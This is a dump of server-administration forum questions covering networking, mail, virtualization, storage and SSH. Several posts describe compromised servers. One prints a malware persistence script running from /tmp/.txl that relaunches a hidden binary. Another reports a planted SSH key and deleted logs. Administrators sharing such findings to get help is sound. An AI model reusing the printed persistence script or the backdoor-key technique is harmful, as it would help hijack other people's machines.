"873593","Is it possible to give preference to one website in dedicated server?","<p>We have multiple websites in different cpanel accounts on our dedicated server. Can we give preference to one site or one cpanel account over others when it comes to handling requests by Apache and other resources?  Os is CentOS.</p>
","<apache-2.4><centos7><website><cpanel>","2017-09-14 09:13:50"
"994238","Exception for redirect iptables","<p>How to make an exception to not redirect to localhost:port?</p>

<pre><code>iptables -t nat -A OUTPUT -p tcp -m tcp --dport 80 -j DNAT --to-destination 127.0.0.1:8000
</code></pre>
","<linux><iptables><ubuntu-18.04>","2019-12-04 07:40:57"
"873650","Apple access to SMB on Linux server","<p>Please help.  Looking for advice as to how best access files on Linux SMB server from Mac machines without running into the inability to use Mac spotlight search. Something like Acronis Files Connect which works on Windows servers but not Linux, would be great.  This an already setup Linux server with thousands of media files on there so not asking the question from a starting point or creation of the server, the server exists already and won't be easy to just change it to Windows etc.  I have limited knowledge of IT so please keep the answers in standard terms.</p>

<p>Many thanks in advance</p>

<p>Alan  FH</p>
","<linux><ubuntu><mac><server-message-block>","2017-09-14 13:30:04"
"873671","How to create a group of servers listening on the same IP-address, allowing failover/takeover?","<p>I'd like to deploy a web application in a robust manner.</p>

<p>The application itself is written using Elixir, which runs on top of Erlang/OTP, meaning that the application can be deployed on different nodes which can internally manage failover/takeover when one of them goes down for some reason.</p>

<p>However, DNS is not built for this: Adding multiple A-records does not mean that clients will try one of the other servers when the one they try to connect to does not respond in time.</p>

<p>A lot of people then give as answer 'use a load balancer', which is nice, but then the load balancer itself becomes a single-point-of-failure.</p>

<p>Luckily, I was pointed to the Border Gateway Protocol, which (if I understood it correctly) allows multiple servers to listen to the same IP-address, and could therefore maybe function as an alternative. I have no idea (yet) how BGP works internally though, and also not if you need dedicated hardware if you want to use it or not.</p>

<p>So what I'd like to do is to:</p>

<ul>
<li>During normal usage, traffic should be split between the two servers roughly equally.</li>
<li>When one of the servers goes down, the other should take over all the traffic.</li>
</ul>

<p>It would be wonderful if the servers could be configured while they are in a somewhat distant geographical location (i.e. <em>not</em> in the same building) to make sure that e.g. local power failures do not shut off both servers at the same time.
I do realize that both Erlang/OTP and BGP require <em>some</em> geographical proximity, because network latency needs to be low enough for these technologies to properly work.</p>

<p>So my questions:</p>

<ol>
<li>Is this possible? If so, how?</li>
<li>Do you need dedicated hardware (like special routers) to make this work, or could this also work in a context where the two servers would be VPSes (Virtual Private Servers) of different providers (in geographical proximity)? </li>
</ol>
","<high-availability><bgp><fault-tolerance>","2017-09-14 14:34:38"
"873695","whats the difference between sigkill and sigabrt?","<p>The other day I experienced a halt in my python application with sigabrt, but I knew that the init should send a sigkill signal. I'm curious what's the difference between them, if any? Can someone give me some resources to read more about this?</p>
","<linux><init><signals>","2017-09-14 15:57:31"
"783574","Comparison between performance of block layout, file layout and object layout of pNFS","<p>As I know, there are three type of pNFS: file layout, block layout and object layout. So, between these types, which layout reach the best performance and which layout has the worst performance.</p>
","<linux><nfs><nfs4>","2016-06-13 07:57:30"
"783576","Comparison about security between file layout and object layout of pNFS","<p>In the three types of pNFS (block layout, file layout and object layout), as I know, block layout is lack of security. So, between file layout and object layout of pNFS, which type is more secure?</p>
","<linux><nfs><nfs4>","2016-06-13 08:02:02"
"873741","How can I check that all files on copied partitions are OK?","<p>I've moved my OS and copied another data partition to new SSD with AOMEI Assistant's ""Migrate OS to SSD"" and ""Partition copy"" respectively. How can I check that every copied file and partitions in general are OK? Is Windows 8.1 disk check tool enough? It's really important data, even a single damaged file can be a huge problem.</p>
","<storage><partition><files><windows-8.1>","2017-09-14 22:20:22"
"994378","What is the MaxEnvelopeSizekb","<p>I have been googling around to find out what the MaxEnvelopeSizekb is.</p>

<p>It seems to be the source of another problem, I cannot tell what it is or what it is for.</p>

<p>Windows server 2016</p>

<pre><code>PS C:\Windows\system32&gt; winrm get winrm/config
Config
    MaxEnvelopeSizekb = 500
    MaxTimeoutms = 60000
    MaxBatchItems = 32000
    MaxProviderRequests = 4294967295
    Client
        NetworkDelayms = 5000
        URLPrefix = wsman
        AllowUnencrypted = true
        Auth
            Basic = true
            Digest = true
            Kerberos = true
            Negotiate = true
            Certificate = true
            CredSSP = false
        DefaultPorts
            HTTP = 5985
            HTTPS = 5986
        TrustedHosts
    Service
        RootSDDL = O:NSG:BAD:P(A;;GA;;;BA)(A;;GR;;;IU)S:P(AU;FA;GA;
        MaxConcurrentOperations = 4294967295
        MaxConcurrentOperationsPerUser = 1500
        EnumerationTimeoutms = 240000
        MaxConnections = 300
        MaxPacketRetrievalTimeSeconds = 120
        AllowUnencrypted = true
        Auth
            Basic = true
            Kerberos = true
            Negotiate = true
            Certificate = false
            CredSSP = false
            CbtHardeningLevel = Relaxed
        DefaultPorts
            HTTP = 5985
            HTTPS = 5986
        IPv4Filter = *
        IPv6Filter = *
        EnableCompatibilityHttpListener = true
        EnableCompatibilityHttpsListener = false
        CertificateThumbprint
        AllowRemoteAccess = true
    Winrs
        AllowRemoteShellAccess = true
        IdleTimeout = 7200000
        MaxConcurrentUsers = 2147483647
        MaxShellRunTime = 2147483647
        MaxProcessesPerShell = 2147483647
        MaxMemoryPerShellMB = 2147483647
        MaxShellsPerUser = 2147483647
</code></pre>
","<windows-server-2016>","2019-12-05 01:02:08"
"952891","asia-southeast1-b computer engine down","<p>2019-02-07 19:52:12.748 JST asia-southeast1-b computer engine down.</p>

<p>event_subtype:  ""compute.instances.hostError""<br>
event_type:  ""GCE_OPERATION_DONE""   </p>

<p>What caused the server down?</p>

<p>How does google solve it?</p>

<p>thank you</p>
","<linux><shutdown>","2019-02-08 03:12:56"
"873859","Ping server until read to login via RDP and attempt to login","<p>Looking for a way via powershell or any means to ping until server is available and once it is then run remote desktop to login.
I have seen it before but unable to find a way to do it.</p>
","<windows><rdp><ping>","2017-09-15 15:13:09"
"873866","Vista to windows 7 upgrade","<p>I am planning to upgrade from Windows vista business to windows 7 home. Can I perform a format on the system disk, boot from the installation DVD, and install the OS on it with it still having a valid license key? Is the OEM vista license key is valid for windows 7 and if so how to preserve it? 
Thanks in advance!</p>
","<windows-7><licensing><windows-vista><upgrade>","2017-09-15 15:20:24"
"994535","Libvirt and macvtap issue on Arch Linux","<p>I'm using Arch Linux (up to date) with QEMU-KVM, libvirt and virt-manager as a front. I have several VMs, but only one running at a time so far. The VM I'm trying to get to work is on Debian 10, but I also have a Kali and a CentOS 7 with the same issue when I try similar things.</p>

<p>The interface I'm trying to use for the macvtap is a wireless card (on a Thinkpad T580 laptop) connected to a wifi access point (WPA2).</p>

<p>I'm trying to set up a macvtap interface to bridge the wlp4s0 connection on my host to one of my VM. To do that, I'm using virt-manager. I have tried bridge and VEPA mode on the macvtap, and I've tried all types of interfaces (virtual hardware) on the VM, to no avail, as there is no network connection. NAT mode, however, works fine on all VMs.</p>

<p>Libvirt does put the device (wlp4s0 on host) on promiscuous mode, though ip-link doesn't show it (flag in /sys/devices/... is changing nonetheless, and dmesg does say something about it entering promiscuous mode).</p>

<p>When launching Wireshark and pinging the gateway (with a fixed ip) from the VM, I do see the ARP request on the host on macvtap and on wlp4s0, but no response.</p>

<p>When using dhcp, dhclient does not get any response.</p>

<p>I can provide more info is needed. If you have any idea of what is causing that, I'll gladly hear your suggestions !</p>
","<kvm-virtualization><libvirt><arch-linux>","2019-12-06 00:36:12"
"953012","What happens to sent emails from localhost without internet connection?","<p>we're building a webshop that will serve as a kiosk on a fair. The fair visitors stop by and order some things at the shop. We'll have some Tablets where the visitors can shop through our kiosk and order some stuff.</p>

<p>Hardware: we'll have a local server, so the website is locally available (like a local domain, or an IP). This server will also act as an access point. So the tablets connect via wifi to the server where the Shop is running.</p>

<p>This shop needs to send the order emails to the customers. It will work for sure if we have some internet connection.</p>

<p><strong>But what happens if the internet connection is lost?</strong></p>

<p>What would happen to the emails being sent without an internet connection?
Is there some kind of email backlog that starts to send the emails when we regain the connection or will the send process just stop and the emails are gone?</p>

<p>We need to get sure <strong>that all order emails are sent properly at some time</strong>, even if the server loses the connection for some minutes or hours.</p>

<p>Some ideas:</p>

<ol>
<li>if we have an internet connection then send the mail (normal
behavior).</li>
<li>If we don't have an internet connection just let the mail on the send queue for later.</li>
<li>If we reestablish the connection, send the emails waiting in the queue.</li>
</ol>

<p>I need to know how systems handle those emails and which part of the system is responsible for the needed email queue (Windows? Linux? The webserver? The used software(WordPress)? ).</p>

<p>I appreciate your thoughts and answers.</p>

<p>Best regards
Wellington</p>
","<email-server><wordpress><localhost>","2019-02-08 17:20:05"
"994582","HA configuration for KVM Guest on iSCSI shared storage","<p>My requirement is to provide HA to a Zimbra Server. We want Zimbra files to be installed in a Netapp SAN which is providing around 5.7 TB as a SAN iSCI Drive. Since Netapp comes in with Dual Controller and stable performance, we are unlikely to have any down time.</p>

<p>I have 2 servers each having Xeon processor 6 Core, 32 GB RAM and 2 x 250 GB SSD. These are the two servers where I have installed CentOS 7.6. We would like to have one as primary and the second one as secondary.</p>

<p>Idea is to use the same principle of KVM HA ( What Redhat and even VMware) provides, so that if the primary goes down the IP gets switched to secondary, to create a simple Hot Redudant system.</p>

<p>We have a very few users on Zimbra, but there are a lot of automated emails coming in and we require a very large storage, and hence we are using the Netapp box.</p>

<p>I am able to switch between the KVMs. However I am struggling to figure out how I need to mount the iSCI target, so that the mail application stays alive.</p>

<p>Zimbra typically installs on /opt/. Do I mount the target on /opt/, and if so will it work? Or am I missing something else?</p>

<p>Or should I run the VM of the shared storage itself, and if so how can I configure it.</p>

<p>Zimbra itself is a combination of a database and files, and uses a number of services to keep itself active. Idea of using a shared storage is for Redundancy and high availability.</p>

<p>I have tried to configure HA but i was stuck over STONITH fence_agents.</p>

<p>By the way i followed this Documentation-</p>

<p><a href=""https://www.lisenet.com/2016/activeactive-high-availability-pacemaker-cluster-with-gfs2-and-iscsi-shared-storage-on-centos-7/"" rel=""nofollow noreferrer"">https://www.lisenet.com/2016/activeactive-high-availability-pacemaker-cluster-with-gfs2-and-iscsi-shared-storage-on-centos-7/</a></p>

<p>Appreciate your response and support.</p>
","<centos><kvm-virtualization><high-availability><iscsi><netapp>","2019-12-06 10:29:18"
"783827","Install Apache mod_evasive on Windows","<p>I want to install Apache mod_evasive on a Windows Server with Apache 2.4 running on it, but I don't know how to compile the mod_evasive24.c file. Is there any place where I can download the compiled .so file of the module?</p>
","<windows><apache-2.4>","2016-06-14 11:07:08"
"874070","Who is the issuer of my SSL certificate?","<p>I have a website and SSL certificate for that domain name. It expired. I don't remember from whom I got this certificate. How do I find out?</p>
","<ssl>","2017-09-17 07:02:01"
"953108","redirect link with question mark in htaccess","<p>I need to redirect:</p>

<pre><code>example.com/wiki/?t=1234 
</code></pre>

<p>to </p>

<pre><code>example.com/vb/showthread.php?t=1234
</code></pre>

<p>The numbers ""1234"" is hundreds of pages with different numbers</p>

<p>I try in .htaccess but doesn't work:</p>

<pre><code>RewriteCond %{QUERY_STRING} t=[0-9]
RewriteRule ^(.*)$ /vb/showthread.php?t=$1 [L]
</code></pre>
","<apache-2.4><.htaccess><redirect>","2019-02-09 09:09:33"
"994679","is it possible to host multiple server that have different IPs on the same port such as 80?","<p>I am trying to setup multiple website domains, but from different servers and because they are different servers they have different IPs, I am wondering if I could port forward each domain to 80, so far when I try port forwarding multiple IPs to port 80 I get an error that says Oops, 'local start port overlaps!' do I have to change options and settings on my router? or what?</p>
","<ubuntu><domain-name-system><web-server><port><port-forwarding>","2019-12-07 04:14:49"
"783898","Jetstor SAN disk firmware","<p>We have a jetstor SAN, specifically <a href=""http://www.9to5computer.com/AC&amp;NC/JetStor%20SATA%20412iS%20iSCSI%20to%20SATA%20Rackmount%20Raid.htm"" rel=""nofollow noreferrer"">http://www.9to5computer.com/AC&amp;NC/JetStor%20SATA%20412iS%20iSCSI%20to%20SATA%20Rackmount%20Raid.htm</a> and now discontinued. </p>

<p>Its run for 6 years and just hit end of warranty. Vendor will provide a disk only warranty for another year and we're planning to upgrade in a year or so, budget depending. As they have us over the proverbial barrel they want a lot of money to provide disks.  </p>

<p>The disks they quote are:</p>

<p>JetStor Seagate ST1000NM0033 1TB SATA Drive for JetStor SAS412iS - they are just Seagate ST1000NM0033 with a modified firmware. They wont tell us (of course) what happens if we used an unmodified disk off the shelf. We probably shouldnt try but does anyone happen to know? Considering the bare enterprise model is about 10% of the quoted price, we're just seeing if we can avoid the expensive warranty for the next year or so and what risk. </p>

<p>We have asked the Vendor but quite rightly they wont help. </p>

<p>I understand this is not the best practice, just want to see if anyone has any idea what would happen.</p>
","<hard-drive><storage-area-network><firmware>","2016-06-14 15:00:16"
"953193","Using windows server 2016 essentials without licence","<p>I have uninstalled the product key from windows server 2016 essentials using <code>cscript.exe c:\windows\system32\slmgr.vbs -upk</code> from a evaluation copy. </p>

<p>I was just wondering if I can use the server without a license without limitations. </p>

<p>Thanks in advanced. </p>

<p>Cheers,</p>

<p>Jack</p>
","<windows-server-2016><licensing>","2019-02-10 07:51:09"
"874212","Continuous deployment on multiple azure VM","<p>we are developing a product where we need to create separate VM for each client. now, we need to deploy code and install packages on the every newly created vm. We are able to create VM using Azure python SDK, need help on deploying code and package installation on the new VM.</p>
","<virtual-machines><azure>","2017-09-18 12:17:26"
"953254","SSH using domain name from internal network","<p>I have a home server running Ubuntu 18.04 that hosts some private services. For access from the outside world, I have a domain that points through my router at my home server. This way I can access webservices, as well as SSH from anywhere, which works fine.</p>

<p>When I am at home I would like to use the same domain address to login to my server. For the webservices this works. However, I cannot login through SSH from my internal network using the domain. I get the following message:</p>

<pre><code>ssh: connect to host xyz.abc.com port 22: Connection refused
</code></pre>

<p>In the interal network I can only connect with SSH if I use the internal IP address of the server.</p>

<p>Do I have to set special configurations for SSH somewhere to make this work?</p>
","<ssh><domain-name>","2019-02-10 21:01:44"
"994769","IPv4 Addresses and AWS Elastic IP","<p>So, the world is finally out of IPv4 addresses. It's been expected at least since I've been to college in 2004.</p>

<p>But how is it that AWS have so much of this precious product, that they can give them away for free with every EC2 instance (free as long as they are in use)?</p>

<p>I would expect Amazon to provide IPv6 addresses for free and charge some kind of premium for the IPv4 addresses it has left.</p>
","<amazon-web-services><ip><ipv6><ipv4>","2019-12-08 09:20:57"
"994771","Sending emails through port 587 in Postfix doesn't work","<p>I installed Plesk Obsidian in Ubuntu 18.04.3.
Trying to send messages through the port 587 I'm getting the following error:</p>

<pre><code>postfix/smtp[116387]: connect to alt1.gmail-smtp-in.l.google.com[209.85.233.27]:25: Connection timed out
</code></pre>

<p>It seems that postfix is still trying to send emails through the port 25, but I already changed my configuration to force postfix to send emails through the port 587 using sumbission.</p>

<p>in /etc/postfix/main.cf I have:</p>

<pre><code>smtpd_tls_security_level=may
inet_protocols = ipv4
</code></pre>

<p>and in /etc/postfix/master.cf</p>

<pre><code>submission inet n       -       n       -       -       smtpd
  -o smtpd_tls_security_level=encrypt
</code></pre>

<p>in Postfix</p>

<pre><code>Enable SMTP service on port 587 on all IP addresses: checked
</code></pre>

<ul>
<li>SPF, DMARC &amp; DKIM records are enabled</li>
</ul>

<p>What could be causing that postfix still uses the port 25 for outgoing emails?</p>
","<linux><postfix><plesk>","2019-12-08 09:53:56"
"994824","AWS Linux Source Code?","<p>We are looking for the source code for Amazon Web Services (AWS) AWS Linux kernel. This should be available under the GPL, but we can't find it, and our requests to Amazon have gone unanswered. </p>

<p>Where can we find it? </p>

<p>We don't want generic Linux kernel sources. We explicitly want the specific code used for the AWS kernel. In particular, we want the code for <code>/dev/random</code>.</p>
","<linux><amazon-web-services><open-source><random-number-generator>","2019-12-08 22:57:52"
"953469","NAS storage comparison for Synology vs Overland","<p>We are looking for NAS solution that will be used as secondary storage to hold large amount of data.
We have received following proposals that are under our pre allocated budget.</p>

<ul>
<li>SnapServer XSR120 / HDD - SnapServer XSR 8TB SATA ENT > QTY: 8 disks 
for RAID10 / 10g network card / Warranty 1 year</li>
<li>Synology with 512gb ssd cache (QTY:2) &amp; Seagate 7200 rm Ironwolf >
QTY 10 disks for RAID10 / 10g network card / Warranty 2 years</li>
</ul>

<p>What are reviews for overland vs synology in terms of reliability &amp; better integration with active directory?</p>
","<storage><network-attached-storage><synology>","2019-02-12 04:08:27"
"784165","PCI DSS Site audit complian scan","<p>We have been asked to turn off our anti-intrusion software and allow a specific IP address unrestricted access through our firewalls by a PCI DSS compliance scanning firm engaged by our merchant services contractor.</p>

<p>Does this make any sense?</p>
","<pci-dss>","2016-06-15 16:22:01"
"953480","Converting a physical Windows partition into a VM for use with KVM, and then configuring the Windows VM as a router for my Linux host?","<p>So bassically, I'm in year 11 and go to highschool. I have got a Linux laptop and asked them to connect Linux to their network (which they do for Windows/Mac computers). They didn't want to (it's not just an open network I can connect to, I think the network requires certain certificates that has to be generated by one of the schools servers or something). I dualboot Windows and Linux so they were willing to connect my Windows partition to their network though.</p>

<p>And now you can start to see where my question is coming from. What I want to do is convert my Windows partition into a virtual machine (with my wifi and ethernet passed through), then I want to make Windows act as a router for my host. So I can use my Windows VM to indirectly connect my Linux host to the network.</p>

<p>Does this seem possible?
I know this isn't really about servers, but it deals with a lot of stuff servers have to deal with, so I figured I'd ask here.</p>
","<linux><windows><virtual-machines><router>","2019-02-12 07:26:02"
"874525","How to Permit/Deny Traffic based on Domain Name (FQDN) rather than ip address in AZURE?","<p>I can add inbound/outbound rules in azure network security group for IP address , but how can i make that for domain name (URL) ?</p>
","<firewall><azure><access-control-list>","2017-09-19 21:28:39"
"995103","change ssh IP based on current network","<p>I have these two entries in my ssh config on my laptop:</p>

<pre><code>Host server1_int
  Hostname 192.168.1.92
  IdentityFile ~/.ssh/id_rsa 
  User me
  Port 1234

Host server1_ext
  Hostname 134.x.y.z
  IdentityFile ~/.ssh/id_rsa
  User me
  Port 4321
</code></pre>

<p>This server is behind a NAT. 
When I am behind the NAT as well I need to ssh into ""server1_int"". If I am somewhere else on the Internet I need to ssh into ""server1_ext"" to reach my server.
Is there a way to configure ssh such that it chooses the right entry based on the subnet my laptop is currently in?</p>
","<ssh>","2019-12-10 21:42:12"
"784318","Delete a file with name '--help' using rm command","<p>just want to share an interesting or rather accidentally discovered bug for Unix 'rm' command. I have accidentally created the file named '--help'. However, when I try to delete using rm command, it does not work and it shows up the help menu for rm instead. Same to mv command, I want to rename it to a valid filename, it shows the help menu of mv.</p>

<hr>

<p>[Answer] To delete the file named '--help', try to use 'find' command.</p>

<p>Thanks for your reading and I hope it somewhat helps.</p>
","<linux>","2016-06-16 09:19:25"
"953647","Where is ""the URL in a HTTP request message""?","<p><em>HTTP: The Definitive Guide</em> says</p>

<blockquote>
  <p>An origin server that isn’t virtually hosted, and doesn’t allow
  resources to differ by the requested host, may ignore the Host header
  field value. But any origin server that does differentiate resources
  based on the host must use the following rules for determining the
  requested resource on an HTTP/1.1 request:</p>
  
  <ol>
  <li><p>If <strong>the URL in the HTTP request message</strong> is absolute (i.e., contains a scheme and host component), the value in the Host header is ignored
  in favor of the URL.</p></li>
  <li><p>If <strong>the URL in the HTTP request message</strong> doesn’t have a host, and the request contains a Host header, the value of the host/port is obtained
  from the Host header.</p></li>
  <li><p>If no valid host can be determined through Steps 1 or 2, a 400 Bad Response response is returned to the client.</p></li>
  </ol>
</blockquote>

<p>Where is ""the URL in the HTTP request message""?</p>

<p>Is it the one in the request line (in the first line in a HTTP request, after method such as <code>GET</code>)?</p>

<p>Thanks.</p>
","<http><url>","2019-02-13 05:10:13"
"784392","How to migrate My Server OS?","<p>I've been researching the past week or so on how to migrate my Windows 2008R2 Server to Linux CentOS, I thought I had a good grip on it but know I'm confused and my networking knowledge isn't as up to par as I thought.</p>

<p>Windows Server 2008R2 is currently running.
DHCP
DNS
Active Directory</p>

<p>I have a Spare server with Centos 7 Currently installed ""Server With GUI"" when installing.</p>

<p>So, I'm wondering, where do I start?
What's the best practice for changing OS?</p>

<p>From what i have found online there isn't a step by step manual, eg, You start with DHCP, then DNS, then etc. etc. etc..</p>

<p>Or if there is I Haven't Found it.</p>

<p>My End goal is to have the Linux Server running everything, but I do not want to interrupt the current Windows Server until I'm essentially plugging it out.</p>

<p>My thought process/goal was.</p>

<ol>
<li>Setup DNS</li>
<li>Connect Computer To Domain And Test</li>
<li>Setup Temoprary File Server</li>
<li>Connect Computer To Test</li>
<li>Build PXE Boot Server For Installing Operating System</li>
<li>Test PXE Server Over Network On One Machine</li>
<li>Setup DHCP</li>
<li>Test Machines On New DHCP Server</li>
<li>Test Software With Server/File Server</li>
<li>Install Linux on all Machines</li>
<li>Take Lunch</li>
</ol>

<p>But I couldn't get the DNS working properly, I followed this guide
<a href=""https://www.unixmen.com/setting-dns-server-centos-7/"" rel=""nofollow noreferrer"">https://www.unixmen.com/setting-dns-server-centos-7/</a></p>

<p>So now i'm questioning if I missed a step, what needs to be done in order for this to work.</p>

<p>Does anyone have anyone know how I can approach this in the most efficient way?
are there any good books I can follow or tutorials on how to approach something like this?</p>

<p>All I need is a list of steps and then I can figure it out from there.</p>
","<windows-server-2008><migration><centos7>","2016-06-16 14:02:13"
"953656","Google Cloud SQL database increase","<p>My Google Cloud SQL automatic storage increased up to 31GB but still the database size is only 120Mb and all the above happens in 3 days?</p>
","<sql><google-cloud-storage><google-cloud-sql>","2019-02-13 06:57:16"
"874643","How many Virtual machines can mount/connect to one azure file share(Storage)?","<p>How many Virtual machines can mount/connect to one azure file share(Storage) ?<br>
Is there any limit quota for azure file share(Storage) ?</p>
","<virtual-machines><azure>","2017-09-20 12:56:19"
"995325","DigitalOcean: public keys get replaced by an obscure key on every reboot","<p>Whenever I reboot my droplet, the keys in the 'authorized_keys' file under /root/.ssh get deleted and a strange, UNKNOWN key, which I never inserted by any method, nor have I seen even in DO control panel, shows there already present. What is peculiar is that in the end of the key, where comment is written, ""motherfucker"" is written in these letters: ""mdrfckr""</p>

<p>I've tried deleting all keys from this file and from my DO control panel and then inserting fresh keys thru DO control panel (thinking that perhaps DO control panel takes precedence and resets the contents of this authorized_keys file at every reboot). But DO control panel keys are there as expected, but they don't seem to have any effect in my logging efforts.</p>

<p>Due to this, every time my droplet reboots, I've to delete this key and insert 2 keys from myself, one ppk key for ftp, and another openssh key for bash terminal. After inserting them, I'm able to work/login normally.</p>

<p>Pls help. Lest there might be some intrusion into my droplet. (DO hasn't replied to my ticket yet, nor do I expect a fast reply from them ever. even their first reply doesn't contain anything useful, and is there just for the sake of that they replied).</p>
","<ssh><login><ubuntu-18.04><digital-ocean>","2019-12-12 11:46:31"
"953815","When a service is specified as (host name, port number), does that specify a transport protocol?","<p>In <code>/etc/services</code>, a service name can have multiple (transport protocol, port number) pairs. For example, </p>

<pre><code>http            80/tcp                  # Hypertext Transfer Protocol
http            80/udp
ssh             22/tcp                  # Secure Shell
ssh             22/udp
telnet          23/tcp                  # Telnet
telnet          23/udp
smtp            25/tcp                  # Simple Mail Transfer Protocol
smtp            25/udp
</code></pre>

<p>When a service is specified as (host name, port number), does that specify a transport protocol?</p>

<p>If yes, where and when is the transport protocol inferred from  (host name, port number)?
I guess not DNS server, because DNS server doesn't know about <code>/etc/services</code> on  individual server machines.</p>

<p>If no, how would you specify a service, so that its transport protocol can be specified as well as its host name and port number?</p>

<p>Thanks.</p>
","<linux><domain-name-system><service>","2019-02-13 21:20:21"
"953845","How to update sqlite3 from python?","<p>How to update sqlite3 from python?</p>

<p>I am having problems with the old version of Slite3 for python3.6.</p>

<p>I need to upgrade for version 3.22.0 or last</p>

<pre><code>root@server01# python3.6m
Python 3.6.7 (default, Dec  5 2018, 15:02:16)
[GCC 4.4.7 20120313 (Red Hat 4.4.7-23)] on linux
Type ""help"", ""copyright"", ""credits"" or ""license"" for more information.
&gt;&gt;&gt; import sqlite3
&gt;&gt;&gt; sqlite3.sqlite_version_info
(3, 6, 20)
&gt;&gt;&gt; quit()
</code></pre>
","<centos><centos6><python><sqlite>","2019-02-14 02:18:47"
"953891","Ethernet cable only works A to B, not reversed. Why?","<p>A custom ethernet cable with both connectors wired as T568B only works when connecting A to B, but not reversed, i.e. when switching ends and connecting B to A.</p>

<p>A is a Mac, B is a 1Gb TP-Link unmanaged switch. Tried with different Macs and switches. “Works” means both devices see each other (the LED in the switch's ethernet port lights up, and on the Mac's System Preferences > Network, “ethernet” has a green dot) and the Mac can connect to the rest of the network.</p>

<p>What might the reason be?</p>
","<networking><routing><switch><ethernet><cable>","2019-02-14 09:36:48"
"953914","How can I set up django with apache?","<p>I am new in django/python. I am currently using django's in-built server for development. </p>

<p>I want to configure apache to run django. As with some google search, I found that I need mod_wsgi, which I have installed on my windows 10.</p>

<p>However putting django in htdocs is still not working. Can someone help?</p>
","<apache-2.4><django>","2019-02-14 11:12:12"
"953929","directory protection in Ubuntu 14.04 Server","<p>I want to run the following on a single ubuntu 14.04 server
- Asterisk
- PHP/Apache/ MySQL</p>

<p>This server will be offline at customer's location.</p>

<p>I want to protect these folders in a way that if my hard drive is stolen, I will not have to worry about my source code and configurations being stolen also;</p>

<pre><code>/var/www/
/etc/asterisk
/var/lib/asterisk
And mySQL  database
</code></pre>

<p>Any insight on how I can do this?</p>
","<apache-2.2><mysql><php><ubuntu-14.04><encrypting-file-system>","2019-02-14 12:03:41"
"953940","How are hackers getting into our server without brute-force?","<p>I am a web developer and we have no one specialising in the wellbeing of the server or the network currently at our office. Usually I can sort many of the issues that arise with my basic knowledge but currently, we have some strange things happening and I have no idea what is going on so I'm looking for some advice from someone a lot more knowledgeable than me to shed some light if possible.</p>

<p>We have an ecloud server hosted by UK Fast (Linux server) and it holds a VPS server and lots of client sites. Yesterday, the server randomly went down and when we realised, we called them up and they said someone had SSH'd in and run the command  <code>sudo rm TSG-server.pub</code> which essentially removed our whole server. UK fast managed to get us an IP of where the user who did this was accessing it from but 1. I don't know how this helps at all and 2. they could have been using a VPN anyway.</p>

<p>The weird thing is that they had a login attempt ad it was successful... So whoever it was, knew the password or got it from somewhere. The only place we have our password is on LastPass and no one else knows it. So we restored the backup and got everything back, changed the password and called it a day.</p>

<p>So cut to this morning and it happened again... except this time they didn't leave any trace of who it was because they made sure they deleted the logs as well...</p>

<p>How could they possibly be doing this and how can we stop this? I don't even know where to begin...</p>

<p>Does anyone have any idea of how this might be happening, please.</p>
","<linux><ubuntu><ssh><ssh-keys><hacking>","2019-02-14 13:11:16"
"995561","High CPU utilization from a script","<p>I found this script is running in my system without any knowledge.</p>

<pre><code>#!/bin/sh
if test -r /tmp/.txl/bash.pid; then
pid=$(cat /tmp/.txl/bash.pid)
if $(kill -CHLD $pid &gt;/dev/null 2&gt;&amp;1)
then
sleep 1
else
cd /tmp/.txl
./run &amp;&gt;/dev/null
exit 0
fi
fi
</code></pre>

<p>Also this script is being triggered by <code>/tmp/.txl/upd &gt;/dev/null 2&gt;&amp;1</code></p>

<p>Can anyone explain why this script is running</p>

<p>Any help will be appreciated..!</p>
","<linux><bash><redhat><shell-scripting>","2019-12-14 12:19:27"
"874931","Modernising a traditional windows app environment","<p>We're a Windows shop with 3-400 applications in our environment in a standard server/client configuration. We have 600+ Windows servers from 2003 to 2012, predominantly virtual with some physicals around. </p>

<p>I'm currently looking at different ways to move this environment forward, I know DevOps exists for more .NET / Custom apps, but what are our options for treating legacy and more traditional apps that aren't going to go away any time soon? Lift and shift into Azure doesn't seem like an effective option. Looking to ultimately monitor and automate alot of the application services restarts and crashes. </p>
","<windows><virtualization><application-pools>","2017-09-21 21:29:29"
"875008","Route to local webserver on a bridged network","<p>I've been asked to develop an intranet website for a small company. This is something I can do, but I'm struggling with the deployment/network part where I am a total beginner.</p>

<p>Here is the network infrastructure of the organization:</p>

<p>WiFi access point----Linux server (Debian)----ISP router</p>

<p>The Linux server has bridged interfaces (through the use of bridge-utils) and is mainly used for logging the traffic. They have installed an Apache web server on the server and asked me to deploy my website there and redirect all user requests to www.company.com to the intranet website instead of reaching the company website www.company.com on the Web.</p>

<p>Can you tell me how to achieve this redirection ? What custom iptables -if possible- rules do I have to use ? Any other better option (is it possible to force the use of a local DNS...) ?</p>

<p>Thanks a lot for your help.</p>
","<domain-name-system><web-server><linux-networking><bridge>","2017-09-22 11:21:40"
"875020","Large MySQL Database back up ZURMO","<p>Not sure if anyone if familiar with Zurmo. Long story short I need to back up the whole database for it. I would use PHPmyadmin but I didn't install it when I set up Ubuntu Server. I want to use MySQLdump command but I'm afraid of crashing the database since its 2GB. Any suggestions ?</p>
","<mysql><database><mysqldump>","2017-09-22 13:11:00"
"995772","Detecting .Money Ransomware on Windows Server 2019","<h2>Problem</h2>

<p>A few weeks back we got hit with a Dharma Ransomware variant called ""Money"". We made the incorrect assumption that this variant began right at the time the user opened the malicious attachment or link. </p>

<p>Saturday we found out that it was actually time-delayed like a lot of them are these days, so although we have decent backup policies and backup retention, we don't have any way to confidently say that we aren't just restoring to snapshots that have the dormant virus living on them.</p>

<p>Since our first time restoring snapshots of all the servers ended with a repeat of the same virus just 10 days later, we're not sure how far back we need to go in order to be sure we're out of the woods.</p>

<h2>Attempts at Detection</h2>

<p>We had malwarebytes premium running on the server we believe started this mess and it didn't detect anything. After the first attack we ran numerous scans with Malwarebytes Premium and enabled Windows Defender with Controlled Folder on the restored snapshot that we thought was safe. Since we found nothing, we incorrectly assumed we were in the clear.</p>

<h2>Other Info</h2>

<p>The Remote Desktop VM we think started the virus has been deleted instead of restored to a snapshot this time, but we have many other servers we can't do that with.</p>

<p>Does anyone have any experience with this virus or have some ideas of how we can detect the malicious EXE laying dormant? That or any good anti-ransomware software you have experience with?</p>

<p>We are all reverted back, but we really need some guidance on prevention and detection of this virus and other ransomware just like it.</p>
","<malware>","2019-12-16 18:53:00"
"875145","Nginx Multiple Virtual Hosts Configurations","<p>As per the requirement for our platform, Every website will be auto-hosted along with DNS configurations, making the site live on domain booked, configuring Nginx for each domain and subdomain.</p>

